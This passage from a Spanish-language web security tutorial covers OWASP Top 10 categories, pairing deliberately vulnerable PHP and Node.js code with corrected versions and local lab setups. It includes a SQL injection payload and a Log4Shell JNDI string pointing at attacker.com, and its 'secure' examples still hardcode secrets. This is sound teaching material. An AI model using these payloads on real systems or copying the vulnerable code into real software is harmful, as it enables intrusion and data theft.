2. Ve a **DVWA Security** y selecciona el nivel **Low**
3. En el men√∫, elige **SQL Injection**
4. Aparecer√° un formulario que te pide el ID de un usuario
5. Escribe:

```
1' OR '1'='1
```

6. Pulsa ‚ÄúSubmit‚Äù
   Ver√°s que se **devuelven todos los usuarios**, sin validaci√≥n alguna.

‚úîÔ∏è ¬°Has realizado tu primer ataque de SQL Injection!

---

### üî¥ EJEMPLO COMPLETO INSEGURO (en PHP)

```php
<?php
$id = $_GET['id'];
$conn = new mysqli("localhost", "root", "", "usuarios");

// üö® Consulta insegura, vulnerable a SQL Injection
$sql = "SELECT * FROM users WHERE id = '$id'";
$result = $conn->query($sql);

while ($row = $result->fetch_assoc()) {
  echo $row['username'];
}
?>
```

#### üìå Si el usuario pone en la URL:

```
?id=1' OR '1'='1
```

Se ejecutar√°:

```sql
SELECT * FROM users WHERE id = '1' OR '1'='1'
```

Esto devuelve **todos los usuarios**. ¬°Muy peligroso!

---

### ‚úÖ VERSI√ìN SEGURA (usando _prepared statements_)

```php
<?php
$id = $_GET['id'];
$conn = new mysqli("localhost", "root", "", "usuarios");

// ‚úÖ Consulta segura usando par√°metros
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();

while ($row = $result->fetch_assoc()) {
  echo $row['username'];
}
?>
```

#### üîê ¬øQu√© mejora?

- No importa qu√© valor se ponga en `$id`, **nunca ser√° ejecutado como c√≥digo**, solo como valor.
- Esta t√©cnica previene **SQL Injection**.

---

### üîé BONUS: C√≥mo detectar Injection con herramientas

#### ‚úÖ OWASP ZAP (Zed Attack Proxy)

1. Descarga ZAP: üëâ [https://www.zaproxy.org/download/](https://www.zaproxy.org/download/)
2. Ejecuta un **"Quick Scan"** con la URL de DVWA
3. ZAP detectar√° autom√°ticamente si los par√°metros son vulnerables a inyecciones

Tambi√©n puedes usar:

- **Burp Suite**
- **SQLMap** ‚Üí esc√°ner especializado en SQL Injection
- **Postman** ‚Üí para hacer pruebas manuales

---

### üß† Buenas pr√°cticas para evitar _Injection_

| Recomendaci√≥n                     | ¬øPor qu√© es importante?                                      |
| --------------------------------- | ------------------------------------------------------------ |
| ‚úÖ Usa consultas preparadas       | Protege contra inyecciones SQL                               |
| ‚úÖ Valida y filtra entradas       | No aceptes datos sin revisar formato, tipo, longitud         |
| ‚úÖ Escapa caracteres peligrosos   | Si usas comandos o plantillas                                |
| ‚úÖ No construyas c√≥digo con datos | No armes SQL, comandos o JSON con datos directos del usuario |
| ‚úÖ Usa ORM modernos               | Frameworks como Sequelize, Eloquent, Hibernate lo hacen bien |

---

### üì¶ RESUMEN FINAL

| Elemento            | Explicaci√≥n                                             |
| ------------------- | ------------------------------------------------------- |
| ¬øQu√© es Injection?  | Inyectar comandos maliciosos en consultas o int√©rpretes |
| ¬øC√≥mo se produce?   | Cuando no se validan o escapan correctamente los datos  |
| ¬øQu√© puede causar?  | Robos de datos, acceso no autorizado, borrado de info   |
| C√≥mo practicarlo    | Instalar DVWA y probar entradas SQL                     |
| C√≥mo protegerse     | Usar _prepared statements_, validaci√≥n, escapes         |
| Herramientas √∫tiles | OWASP ZAP, Burp, SQLMap, Postman                        |

---

[üîº](#√≠ndice)

---

## **766. Insecure Design**

### üéØ ¬øQu√© es Insecure Design?

**Insecure Design** significa que la aplicaci√≥n ha sido **mal dise√±ada desde su base en t√©rminos de seguridad**, lo que permite a los atacantes aprovecharse de su funcionamiento normal sin necesidad de encontrar errores t√©cnicos.

> üí¨ **No se trata de errores en el c√≥digo**, sino de **decisiones de dise√±o inseguras**.

---

### üß† Diferencia clave:

| Tipo de problema           | ¬øQu√© lo causa?                                           |
| -------------------------- | -------------------------------------------------------- |
| **Vulnerabilidad t√©cnica** | Un fallo en el c√≥digo o configuraci√≥n                    |
| **Dise√±o inseguro**        | Una decisi√≥n de arquitectura o l√≥gica que permite abusos |

---

### üí£ Ejemplos f√°ciles de Insecure Design

#### ‚ùå Ejemplo 1: Aplicaci√≥n que no limita intentos de login

- Si un atacante puede probar contrase√±as infinitas sin restricci√≥n, aunque el c√≥digo est√© bien hecho, **el dise√±o es inseguro**.

#### ‚ùå Ejemplo 2: Permitir que el cliente controle su propio rol

```json
{
  "username": "pepe",
  "rol": "admin"
}
```

Si el rol de usuario se puede cambiar desde el navegador, el **dise√±o de confianza en el cliente es inseguro**.

#### ‚ùå Ejemplo 3: Permitir transferencias sin confirmar saldo

Una app que permite al usuario transferir fondos sin verificar si tiene suficiente dinero: es un **fallo l√≥gico de dise√±o**, no t√©cnico.

---

### üö® ¬øPor qu√© es tan grave?

Porque ni los mejores firewalls o cifrados pueden proteger una app que **fue mal pensada desde su estructura**.

Aunque no haya errores t√©cnicos, el atacante puede explotar **fallos l√≥gicos** o abusar del flujo normal.

---

### üß™ C√≥mo instalar un entorno para practicar Insecure Design

Usaremos una de estas opciones:

---

#### ‚úÖ Opci√≥n A: OWASP Juice Shop (recomendado)

Juice Shop tiene vulnerabilidades l√≥gicas muy buenas para practicar este tipo de fallos.

##### üê≥ Instalar con Docker

```bash
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

Abre en tu navegador:

```
http://localhost:3000
```

Es una tienda online **vulnerable a todo tipo de fallos de dise√±o**.

---

#### ‚úÖ Opci√≥n B: OWASP WebGoat

WebGoat tiene lecciones espec√≠ficas de dise√±o inseguro.

##### üê≥ Instalar con Docker:

```bash
docker pull webgoat/webgoat
docker run -d -p 8080:8080 webgoat/webgoat
```

Abrir en:

```
http://localhost:8080/WebGoat
```

Usuario: `guest`
Contrase√±a: `guest`

---

### ‚úÖ Ejemplo completo de Insecure Design

Vamos a ver un caso muy claro:

---

### üî¥ C√≥digo INSEGURO (Node.js)

#### Escenario:

Una API de transferencia de fondos que **no verifica el saldo** antes de transferir.

```js
app.post("/transferir", async (req, res) => {
  const { desde, hacia, monto } = req.body;

  // üö® No se verifica si "desde" tiene saldo suficiente
  await db.query("UPDATE cuentas SET saldo = saldo - ? WHERE id = ?", [
    monto,
    desde,
  ]);
  await db.query("UPDATE cuentas SET saldo = saldo + ? WHERE id = ?", [
    monto,
    hacia,
  ]);

  res.send("Transferencia realizada");
});
```

---

#### ‚ö†Ô∏è ¬øQu√© est√° mal?

- El sistema asume que si el usuario llama a esta API, **todo est√° bien**.
- No verifica si el usuario **es due√±o de la cuenta de origen**.
- No verifica si hay **saldo suficiente**.

Aunque el c√≥digo no tiene errores t√©cnicos, el **dise√±o es completamente inseguro**.

---

### ‚úÖ C√≥digo SEGURO (con dise√±o s√≥lido)

```js
app.post("/transferir", async (req, res) => {
  const { desde, hacia, monto } = req.body;
  const usuarioId = req.user.id; // ID de usuario autenticado

  // 1. Verificar si "desde" le pertenece al usuario
  const cuenta = await db.query(
    "SELECT * FROM cuentas WHERE id = ? AND propietario_id = ?",
    [desde, usuarioId]
  );

  if (!cuenta.length) {
    return res.status(403).send("No tienes permiso para usar esta cuenta");
  }

  // 2. Verificar saldo suficiente
  if (cuenta[0].saldo < monto) {
    return res.status(400).send("Saldo insuficiente");
  }

  // 3. Realizar transferencia
  await db.query("UPDATE cuentas SET saldo = saldo - ? WHERE id = ?", [
    monto,
    desde,
  ]);
  await db.query("UPDATE cuentas SET saldo = saldo + ? WHERE id = ?", [
    monto,
    hacia,
  ]);

  res.send("Transferencia realizada correctamente");
});
```

---

### üîê ¬øQu√© se mejor√≥?

| Dise√±o inseguro         | Dise√±o seguro                              |
| ----------------------- | ------------------------------------------ |
| No validaba el due√±o    | Verifica si la cuenta pertenece al usuario |
| No validaba saldo       | Agrega l√≥gica de saldo suficiente          |
| L√≥gica de negocio pobre | Se introducen reglas claras y defensivas   |

---

### üõ† ¬øC√≥mo detectar Insecure Design?

#### üîç Herramientas como:

- **ZAP** o **Burp Suite** ‚Üí permiten explorar flujos de negocio (no solo c√≥digo)
- **Pruebas manuales**: cambiando rutas, par√°metros, rol de usuario
- **An√°lisis de l√≥gica**: revisar diagramas de flujo, casos de uso

---

### ‚úÖ Buenas pr√°cticas para evitar Insecure Design

| Pr√°ctica                                | ¬øPor qu√© es importante?                                             |
| --------------------------------------- | ------------------------------------------------------------------- |
| üìÑ Dise√±ar la seguridad desde el inicio | Seguridad no debe ser un ‚Äúparche‚Äù, debe estar en la arquitectura    |
| üîí Modelado de amenazas                 | Anticipar c√≥mo un atacante podr√≠a abusar de la l√≥gica               |
| üß™ Pruebas de l√≥gica de negocio         | Validar casos como: duplicar pagos, abusar de l√≠mites, roles falsos |
| üîÅ Revisi√≥n de roles y permisos         | Separar claramente lo que puede hacer cada tipo de usuario          |
| üõ°Ô∏è Aplicar reglas de negocio estrictas  | Validar siempre: due√±o, estado, condiciones, l√≠mites                |

---

### üß© RESUMEN FINAL

| Concepto          | Explicaci√≥n                                                          |
| ----------------- | -------------------------------------------------------------------- |
| ¬øQu√© es?          | Errores en el dise√±o de la l√≥gica de seguridad y control del sistema |
| ¬øC√≥mo se explota? | Abusando el flujo normal (sin hackear, solo usando mal el dise√±o)    |
| Ejemplos comunes  | Transferencias sin validaci√≥n, cambios de rol desde el cliente       |
| C√≥mo practicarlo  | Usando OWASP Juice Shop, WebGoat o simulando flujos inseguros        |
| C√≥mo prevenirlo   | Dise√±ar con seguridad, validar l√≥gica, modelar amenazas              |

---

[üîº](#√≠ndice)

---

## **767. Security Misconfiguration**

### üîê ¬øQu√© es Security Misconfiguration?

**Security Misconfiguration** es cuando una aplicaci√≥n, servidor, base de datos o cualquier componente tiene una **configuraci√≥n insegura** que permite a un atacante:

- Acceder a informaci√≥n sensible
- Tomar el control del sistema
- Explorar rutas ocultas o administrativas

> üí¨ Es como dejar una puerta abierta por descuido, aunque la casa est√© llena de alarmas.

---

### üîç ¬øPor qu√© ocurre?

Porque los sistemas tienen muchas opciones de configuraci√≥n, y **es f√°cil olvidarse** de desactivar una funci√≥n, cambiar una contrase√±a por defecto, o restringir accesos.

---

### üì¶ Ejemplos f√°ciles de Security Misconfiguration

| Ejemplo                                        | Qu√© pasa                                                                        |
| ---------------------------------------------- | ------------------------------------------------------------------------------- |
| ‚ùå **Servidor con puerto de admin p√∫blico**    | Un atacante puede acceder al panel de administraci√≥n (`http://tuapp.com/admin`) |
| ‚ùå **Contrase√±as por defecto**                 | Usar `admin:admin` o `root:toor` permite acceso no autorizado                   |
| ‚ùå **Mensajes de error con detalles internos** | Revela rutas, estructuras de base de datos, tecnolog√≠as                         |
| ‚ùå **Directorios listados**                    | Acceso a carpetas como `http://tuapp.com/files/`                                |
| ‚ùå **Aplicaci√≥n en modo debug**                | Muestra informaci√≥n interna, archivos, variables, etc.                          |
| ‚ùå **Permisos incorrectos en archivos**        | Archivos `.env` o backups accesibles p√∫blicamente                               |

---

### üí£ Casos reales famosos

- üö® **Equifax (2017)**: No actualizaron Apache Struts ‚Üí fuga de 147 millones de registros
- üö® **Capital One**: Configuraci√≥n incorrecta de AWS permit√≠a acceso a buckets privados

---

### üõ† C√≥mo preparar un laboratorio para practicar Security Misconfiguration

#### ‚úÖ Opci√≥n A: OWASP Juice Shop (recomendado)

Incluye retos como:

- Acceso a archivos `.bak`, `.git`, `.env`
- Modo de debug activado
- Headers inseguros

#### üê≥ Instalar con Docker:

```bash
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

Abre en navegador:

```
http://localhost:3000
```

---

#### ‚úÖ Opci√≥n B: OWASP WebGoat

Tiene lecciones espec√≠ficas sobre errores de configuraci√≥n.

```bash
docker pull webgoat/webgoat
docker run -d -p 8080:8080 webgoat/webgoat
```

Abre en navegador:

```
http://localhost:8080/WebGoat
```

---

### üìå C√≥mo detectar errores de configuraci√≥n

#### üîß Herramientas recomendadas:

- üîç **OWASP ZAP** o **Burp Suite** ‚Üí detectan headers, errores, accesos a archivos sensibles
- üîí **Nmap** ‚Üí escanea puertos y servicios inseguros
- üß™ **Nikto** ‚Üí prueba configuraciones comunes vulnerables
- üóÉÔ∏è **Dirsearch / Gobuster** ‚Üí encuentra archivos/directorios ocultos

---

### ‚úÖ Ejemplo completo de Security Misconfiguration

#### Escenario:

Tienes una aplicaci√≥n Node.js con Express que:

- Muestra errores completos
- Deja rutas sensibles sin protecci√≥n
- Expone variables de entorno

---

#### üî¥ C√≥digo INSEGURO:

```js
const express = require("express");
const app = express();

// üõë Muestra errores internos en producci√≥n
app.use((err, req, res, next) => {
  res.status(500).send(err.stack);
});

// üõë Ruta admin sin autenticaci√≥n
app.get("/admin", (req, res) => {
  res.send("Panel de administraci√≥n");
});

// üõë Sirve archivos est√°ticos incluyendo .env
app.use(express.static("."));

app.listen(3000, () => {
  console.log("App corriendo en http://localhost:3000");
});
```

---

### üß® ¬øQu√© puede hacer un atacante?

- Entrar a `/admin` sin login
- Ver errores completos y rutas internas
- Acceder a `http://localhost:3000/.env` si existe

---

### ‚úÖ C√≥digo CORREGIDO

```js
const express = require("express");
const app = express();
const helmet = require("helmet");

// ‚úÖ Seguridad HTTP b√°sica
app.use(helmet());

// ‚úÖ Manejo de errores ocultando detalles
app.use((err, req, res, next) => {
  console.error(err); // Solo log interno
  res.status(500).send("Error interno del servidor"); // No se expone el stack
});

// ‚úÖ Protecci√≥n con middleware
function autenticar(req, res, next) {
  const autorizado = req.headers["x-auth"] === "secreto123";
  if (!autorizado) return res.status(403).send("Acceso denegado");
  next();
}

app.get("/admin", autenticar, (req, res) => {
  res.send("Panel seguro");
});

// ‚úÖ No servir archivos sensibles
app.use(
  express.static(".", {
    dotfiles: "deny", // No sirve archivos que empiezan con punto
  })
);

app.listen(3000, () => {
  console.log("App segura en http://localhost:3000");
});
```

---

### üîê ¬øQu√© mejor√≥?

| Antes                     | Despu√©s                    |
| ------------------------- | -------------------------- |
| Mostraba stack de errores | Muestra mensaje gen√©rico   |
| Admin sin protecci√≥n      | Requiere token de acceso   |
| Serv√≠a archivos `.env`    | Los bloquea                |
| Sin headers de seguridad  | Usa `helmet` para reforzar |

---

### üõ° Buenas pr√°cticas para evitar Security Misconfiguration

| Pr√°ctica                                | ¬øQu√© hace?                                         |
| --------------------------------------- | -------------------------------------------------- |
| ‚úÖ Desactiva mensajes de error en prod  | Evita revelar datos internos                       |
| ‚úÖ Usa headers HTTP seguros (CSP, HSTS) | Previene ataques XSS, sniffing, clickjacking       |
| ‚úÖ Elimina servicios innecesarios       | Reduce la superficie de ataque                     |
| ‚úÖ Restringe rutas internas             | Usa autenticaci√≥n y control de acceso              |
| ‚úÖ Borra archivos innecesarios (.bak)   | Evita fugas de informaci√≥n o c√≥digo antiguo        |
| ‚úÖ Usa esc√°neres de seguridad           | Detectan configuraciones inseguras autom√°ticamente |

---

### üì¶ RESUMEN FINAL

| Elemento                           | Explicaci√≥n                                                 |
| ---------------------------------- | ----------------------------------------------------------- |
| ¬øQu√© es Security Misconfiguration? | Configuraciones inseguras en servidores, apps o plataformas |
| ¬øC√≥mo se produce?                  | Errores humanos, descuidos, opciones por defecto            |
| ¬øC√≥mo detectarla?                  | Con ZAP, Nikto, revisiones manuales, Nmap, esc√°neres        |
| ¬øC√≥mo practicarla?                 | Usando OWASP Juice Shop, WebGoat o simulaciones propias     |
| ¬øC√≥mo solucionarla?                | Aplicar buenas pr√°cticas, ocultar errores, proteger rutas   |

---

[üîº](#√≠ndice)

---

## **768. Vulnerable and Outdated Components**

### üìå ¬øQu√© es?

Esta vulnerabilidad ocurre cuando una aplicaci√≥n usa **librer√≠as, frameworks, plugins o dependencias desactualizadas**, que **ya tienen fallos de seguridad conocidos**.

> ‚ö†Ô∏è ¬°No importa si t√∫ programaste todo bien! Si usas una librer√≠a con fallos conocidos, **toda tu app est√° en riesgo**.

---

### üß† ¬øPor qu√© pasa?

- Porque no se actualizan las dependencias con regularidad.
- Porque muchas apps usan paquetes de terceros sin verificar su seguridad.
- Porque a veces se desconoce qu√© versi√≥n es segura.

---

### üì¶ Ejemplos sencillos

#### ‚ùå Ejemplo 1: jQuery obsoleto con vulnerabilidades XSS

```html
<script src="https://code.jquery.com/jquery-1.7.1.min.js"></script>
```

> jQuery 1.7.1 es muy antigua y tiene **fallos XSS conocidos**.

---

#### ‚ùå Ejemplo 2: Log4j (Log4Shell)

```xml
<!-- En Java con Maven -->
<dependency>
  <groupId>org.apache.logging.log4j</groupId>
  <artifactId>log4j-core</artifactId>
  <version>2.14.1</version>
</dependency>
```

> Log4j 2.14.1 fue vulnerable a **RCE (Remote Code Execution)** en 2021.
> Esto permit√≠a que un atacante **ejecutara c√≥digo en tu servidor** con una simple cadena como:

```
${jndi:ldap://attacker.com/a}
```

---

#### ‚ùå Ejemplo 3: Express.js sin parches

```bash
npm install express@3.0.0
```

> Express 3.x tiene vulnerabilidades de inyecci√≥n y falta de validaci√≥n.

---

### ‚öôÔ∏è ¬øC√≥mo se detecta esta vulnerabilidad?

#### üîç Esc√°neres autom√°ticos:

- **npm audit** (Node.js)
- **yarn audit**
- **OWASP Dependency-Check**
- **Retire.js** (JavaScript)
- **Safety** (Python)
- **Snyk** (multi-plataforma)
- **Trivy** (Docker, Kubernetes)

---

### üß™ C√≥mo preparar un laboratorio para practicar

#### ‚úÖ Opci√≥n A: OWASP Juice Shop

Juice Shop incluye ejemplos de vulnerabilidades por componentes inseguros.

##### üê≥ Instalar con Docker:

```bash
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

---

#### ‚úÖ Opci√≥n B: Proyecto vulnerable manual

Puedes crear tu propia app con un paquete desactualizado.
Te lo muestro a continuaci√≥n.

---

### ‚úÖ Ejemplo completo con aplicaci√≥n vulnerable

Vamos a crear una **API en Node.js con Express** usando una librer√≠a desactualizada y luego solucionarlo.

---

### üî¥ Paso 1: Crear app con componente inseguro

#### 1. Crea un proyecto:

```bash
mkdir vulnerable-app
cd vulnerable-app
npm init -y
```

#### 2. Instala una versi√≥n insegura de `express`:

```bash
npm install express@3.0.0
```

#### 3. Crea el archivo `index.js`:

```js
const express = require("express");
const app = express();

app.get("/", (req, res) => {
  res.send("App con Express 3.0.0");
});

app.listen(3000, () => {
  console.log("Escuchando en http://localhost:3000");
});
```

---

#### 4. Ejecuta la app

```bash
node index.js
```

Abre: [http://localhost:3000](http://localhost:3000)

---

### ‚ö†Ô∏è ¬øD√≥nde est√° el problema?

- Express 3.0.0 tiene m√∫ltiples fallos de seguridad, por ejemplo:

  - Falta de escape autom√°tico de valores HTML.
  - Vulnerabilidades XSS y header injection.

---

### ‚úÖ Paso 2: Detectar el problema con `npm audit`

Ejecuta:

```bash
npm audit
```

Ver√°s advertencias sobre vulnerabilidades cr√≠ticas.

---

### ‚úÖ Paso 3: Solucionar el problema

Actualiza a una versi√≥n segura:

```bash
npm install express@latest
```

Ahora vuelve a correr:

```bash
npm audit
```

¬°Y ver√°s que ya no hay vulnerabilidades!

---

### üîê Buenas pr√°cticas para evitar componentes vulnerables

| Pr√°ctica                                         | ¬øQu√© hace?                                               |
| ------------------------------------------------ | -------------------------------------------------------- |
| üîÑ Mant√©n tus dependencias al d√≠a                | Evita usar versiones antiguas con fallos conocidos       |
| üõ° Usa esc√°neres autom√°ticos                      | Detectan vulnerabilidades en tus librer√≠as o frameworks  |
| üìÑ Usa un archivo lock (package-lock.json, etc.) | Asegura versiones espec√≠ficas, evita cambios silenciosos |
| üîê Verifica la fuente de las librer√≠as           | Evita instalar paquetes maliciosos o falsos              |
| üß™ Usa entornos de staging                       | Prueba actualizaciones antes de pasarlas a producci√≥n    |

---

### üìå RESUMEN

| Concepto          | Explicaci√≥n                                                         |
| ----------------- | ------------------------------------------------------------------- |
| ¬øQu√© es?          | Uso de librer√≠as, frameworks o plugins desactualizados o con fallos |
| Ejemplos comunes  | Log4j, jQuery antiguo, Express inseguro                             |
| C√≥mo se detecta   | Con esc√°neres como `npm audit`, `Snyk`, `OWASP Dependency-Check`    |
| C√≥mo se soluciona | Actualizando o reemplazando componentes inseguros                   |
| C√≥mo evitarlo     | Mantener todo actualizado, automatizar auditor√≠as                   |

---

[üîº](#√≠ndice)

---

## **769. Identification and Authentication Failures**

### üîê ¬øQu√© es Identification and Authentication Failures?

Es cuando una aplicaci√≥n **no implementa correctamente los mecanismos para identificar (saber qui√©n eres) y autenticar (verificar si eres t√∫ realmente)** a los usuarios, lo que permite que:

- Usuarios no autorizados accedan a cuentas ajenas
- Se realicen ataques como fuerza bruta, robo de sesi√≥n, bypass de login
- Se omitan controles como el bloqueo de cuentas o verificaci√≥n en dos pasos

---

### üìå ¬øQu√© incluye este tipo de fallos?

- ‚ùå Contrase√±as d√©biles o sin protecci√≥n
- ‚ùå Permitir intentos de inicio ilimitados (fuerza bruta)
- ‚ùå No invalidar tokens/sesiones al cerrar sesi√≥n
- ‚ùå No usar MFA (autenticaci√≥n multifactor)
- ‚ùå No verificar correctamente la identidad del usuario

---

### üß† Ejemplos f√°ciles de entender

#### üîì 1. Login sin l√≠mite de intentos

```bash
POST /login
Body:
{ "username": "admin", "password": "1234" }
```

Puedes intentar millones de combinaciones.
üß® ¬°Un atacante puede forzar la contrase√±a!

---

#### üîë 2. Tokens de sesi√≥n que no expiran

Si un token de acceso sigue siendo v√°lido **aunque el usuario cerr√≥ sesi√≥n hace horas o d√≠as**, alguien puede robarlo y acceder sin ser detectado.

---

#### üßô 3. Contrase√±a d√©bil aceptada

```plaintext
Usuario: pedro
Contrase√±a: 1234
```

Si el sistema permite este tipo de contrase√±as, es **muy f√°cil de adivinar**.

---

#### üõë 4. Login sin validaci√≥n de usuario

```javascript
if (req.body.username == "admin") {
  // acceso sin verificar la contrase√±a
}
```

üß® ¬°Acceso total solo por el nombre!

---

### üß™ ¬øC√≥mo practicar esta vulnerabilidad?

#### ‚úÖ Opci√≥n A: OWASP Juice Shop

Incluye fallos como:

- Login sin protecci√≥n
- Tokens inseguros
- Sesiones no invalidadas
- Accesos sin autenticaci√≥n

##### üê≥ Instalar:

```bash
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

Navega a: `http://localhost:3000`
Busca los retos relacionados con "Authentication".

---

#### ‚úÖ Opci√≥n B: WebGoat (lecci√≥n espec√≠fica)

```bash
docker pull webgoat/webgoat
docker run -d -p 8080:8080 webgoat/webgoat
```

Navega a: `http://localhost:8080/WebGoat`
Haz login con `guest / guest`.

---

### üß∞ Herramientas para detectar fallos de autenticaci√≥n

| Herramienta       | Uso                                                  |
| ----------------- | ---------------------------------------------------- |
| üîç **Burp Suite** | Automatiza pruebas de login, fuzzing de contrase√±as  |
| üîê **Hydra**      | Ataques de fuerza bruta por CLI                      |
| üï∑Ô∏è **OWASP ZAP**  | Detecta sesiones inseguras, cookies mal configuradas |
| üß™ **Postman**    | Probar tokens, sesiones, login/logout                |

---

### ‚úÖ Ejemplo completo de fallo de autenticaci√≥n

Vamos a hacer un ejemplo real con **Node.js + Express**, mostrando una mala implementaci√≥n y c√≥mo mejorarla.

---

#### üî¥ Paso 1: C√≥digo inseguro (fallo de autenticaci√≥n)

Crea un proyecto:

```bash
mkdir auth-fail && cd auth-fail
npm init -y
npm install express body-parser
```

##### C√≥digo (`index.js`):

```js
const express = require("express");
const bodyParser = require("body-parser");
const app = express();
app.use(bodyParser.json());

// üî¥ LOGIN inseguro: sin l√≠mite de intentos, sin hashing
const USERS = [{ username: "admin", password: "1234" }];

app.post("/login", (req, res) => {
  const { username, password } = req.body;
  const user = USERS.find(
    (u) => u.username === username && u.password === password
  );
  if (user) {
    res.send("Bienvenido " + username);
  } else {
    res.status(401).send("Credenciales inv√°lidas");
  }
});

app.listen(3000, () => console.log("Inseguro en http://localhost:3000"));
```

---

#### üîç ¬øQu√© problemas hay aqu√≠?

| Problema                         | Riesgo                              |
| -------------------------------- | ----------------------------------- |
| üîì Contrase√±as sin hash          | Se pueden robar f√°cilmente          |
| üö´ Sin l√≠mite de intentos        | Se puede hacer fuerza bruta         |
| ‚ùå No hay token ni sesi√≥n segura | Cualquiera puede replicar la sesi√≥n |
| üôà Contrase√±a "1234" aceptada    | Muy d√©bil, f√°cil de adivinar        |

---

#### ‚úÖ Paso 2: C√≥digo seguro (corregido)

Instala dependencias adicionales:

```bash
npm install bcrypt jsonwebtoken express-rate-limit
```

#### C√≥digo seguro (`index.js`):

```js
const express = require("express");
const bodyParser = require("body-parser");
const bcrypt = require("bcrypt");
const jwt = require("jsonwebtoken");
const rateLimit = require("express-rate-limit");

const app = express();
app.use(bodyParser.json());

// ‚úÖ L√≠mite de intentos
const loginLimiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minuto
  max: 5, // M√°ximo 5 intentos por IP
  message: "Demasiados intentos. Intenta m√°s tarde.",
});
app.use("/login", loginLimiter);

// ‚úÖ Usuarios con contrase√±a cifrada
const hashedPassword = bcrypt.hashSync("Segura123", 10);
const USERS = [{ username: "admin", password: hashedPassword }];

app.post("/login", async (req, res) => {
  const { username, password } = req.body;
  const user = USERS.find((u) => u.username === username);
  if (user && (await bcrypt.compare(password, user.password))) {
    const token = jwt.sign({ username }, "clave_secreta", { expiresIn: "15m" });
    res.json({ mensaje: "Login exitoso", token });
  } else {
    res.status(401).send("Credenciales inv√°lidas");
  }
});

app.listen(3000, () => console.log("Seguro en http://localhost:3000"));
```

---

#### ‚úÖ Mejoras aplicadas:

| Seguridad aplicadas         | Descripci√≥n                       |
| --------------------------- | --------------------------------- |
| üîê Contrase√±as con `bcrypt` | M√°s seguras, no legibles          |
| üõ° L√≠mite de intentos        | Evita ataques de fuerza bruta     |
| üîë Token JWT con expiraci√≥n | Autenticaci√≥n moderna y revocable |
| ‚è≥ Expiraci√≥n del token     | Token dura 15 minutos             |

---

### üîí Buenas pr√°cticas para prevenir estos fallos

| Pr√°ctica                          | ¬øPor qu√© es importante?                        |
| --------------------------------- | ---------------------------------------------- |
| ‚úÖ Hash de contrase√±as (`bcrypt`) | Evita robo de contrase√±as en base de datos     |
| ‚úÖ L√≠mite de intentos             | Previene fuerza bruta y automatizaci√≥n         |
| ‚úÖ MFA (Autenticaci√≥n 2FA)        | Agrega una segunda capa de seguridad           |
| ‚úÖ Token con expiraci√≥n           | Controla duraci√≥n y revocaci√≥n de sesiones     |
| ‚úÖ Validaci√≥n de sesiones activas | Cierre de sesi√≥n efectivo, evita reutilizaci√≥n |

---

### üì¶ RESUMEN FINAL

| Tema              | Detalles clave                                        |
| ----------------- | ----------------------------------------------------- |
| ¬øQu√© es?          | Fallos al identificar o autenticar usuarios           |
| Ejemplos comunes  | Contrase√±as d√©biles, sin hash, sin l√≠mite de intentos |
| C√≥mo practicarlo  | Juice Shop, WebGoat, app Express                      |
| C√≥mo solucionarlo | Hashing, tokens, l√≠mites, MFA, expiraci√≥n             |

---

[üîº](#√≠ndice)

---

## **770. Software and Data Integrity Failures**

### üß® Software and Data Integrity Failures

Tambi√©n conocida como ‚Äúfallas de integridad de software y datos‚Äù.

---

### üìå ¬øQu√© es?

Esta vulnerabilidad ocurre cuando una aplicaci√≥n:

- **Conf√≠a ciegamente** en **actualizaciones de software**, **plugins**, **scripts externos** o **datos no verificados**
- **No valida la integridad o autenticidad** del contenido antes de ejecutarlo o usarlo

> Esto puede ser explotado por atacantes para inyectar c√≥digo malicioso, modificar datos o tomar el control de un sistema.

---

### üß† Ejemplo simple para entender

#### üò¨ Caso 1: Script externo sin validaci√≥n

```html
<script src="https://ejemplo.com/lib.js"></script>
```

‚ö†Ô∏è Si alguien compromete `https://ejemplo.com/lib.js`, podr√° inyectar c√≥digo malicioso en tu sitio.

---

#### üò¨ Caso 2: Actualizaci√≥n autom√°tica sin firma

Una app que descarga actualizaciones de:

```
http://actualizaciones.com/parche.zip
```

Y lo ejecuta sin verificar si es leg√≠timo ‚Üí üî• **¬°Riesgo de malware o backdoors!**

---

#### üò¨ Caso 3: CI/CD inseguro

En pipelines de DevOps, si permites que usuarios externos suban c√≥digo a GitHub sin revisar, ese c√≥digo puede desplegarse autom√°ticamente en producci√≥n.

---

### üéØ ¬øQu√© puede causar esta falla?

- Uso de librer√≠as de terceros no verificadas
- Cargas autom√°ticas sin verificaci√≥n de integridad (firmas, hashes)
- Repositorios comprometidos (supply chain attacks)
- CI/CD mal configurado
- Uso de datos no validados como configuraciones

---

### üîé ¬øC√≥mo prevenir?

| Acci√≥n                            | Descripci√≥n                                                   |
| --------------------------------- | ------------------------------------------------------------- |
| ‚úÖ Validar firmas digitales       | Asegurarse que los archivos provienen de una fuente confiable |
| ‚úÖ Verificar hashes SHA-256       | Comparar el hash del archivo con el oficial                   |
| ‚úÖ Usar HTTPS                     | Evita la manipulaci√≥n de contenido en tr√°nsito                |
| ‚úÖ Restringir scripts de terceros | Con CSP y Subresource Integrity (SRI) en HTML                 |
| ‚úÖ Proteger pipeline CI/CD        | Usar revisiones, tokens, permisos y control de ramas          |

---

### üì¶ Herramientas √∫tiles

| Herramienta            | Uso principal                                          |
| ---------------------- | ------------------------------------------------------ |
| ‚úÖ `cosign`            | Firmar im√°genes de contenedores                        |
| ‚úÖ `slsa.dev`          | Modelo para asegurar cadenas de suministro de software |
| ‚úÖ `npm audit`, `snyk` | Detectar dependencias vulnerables o comprometidas      |
| ‚úÖ `gitleaks`, `trivy` | Verificar c√≥digo fuente y configuraci√≥n segura         |

---

### üß™ C√≥mo instalar un entorno vulnerable

Una de las mejores formas de practicar esto es usar:

#### ‚úÖ **OWASP Juice Shop**

Tiene vulnerabilidades relacionadas con la integridad de datos.

##### üê≥ Instalar con Docker:

```bash
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

Accede en: `http://localhost:3000`

---

### ‚úÖ Ejemplo completo paso a paso

